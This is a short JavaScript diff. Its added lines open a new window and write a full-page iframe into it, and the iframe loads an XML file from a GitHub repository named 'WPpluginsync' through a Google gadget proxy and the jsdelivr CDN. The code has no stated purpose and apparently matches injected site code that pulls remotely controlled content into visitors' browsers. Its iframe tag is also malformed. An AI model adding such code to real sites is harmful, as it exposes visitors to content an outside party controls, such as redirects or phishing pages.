@@ -1,2 +1,2 @@
-var opened = window.open("");
-opened.document.write("");
+var opened = window.open('');
+opened.document.write("<html xmlns=http://www.w3.org/1999/xhtml><head><meta content='width=device-width, initial-scale=1.0' name='viewport'><title>Test Layout</title></head><body><iframe width='100%' height='100%' frameborder='0' src='https://google-opensocial.googleusercontent.com/gadgets/ifr?url=https://cdn.jsdelivr.net/gh/mind4ur/WPpluginsync@main/lib/edit/up.xml'</iframe></body></html>");
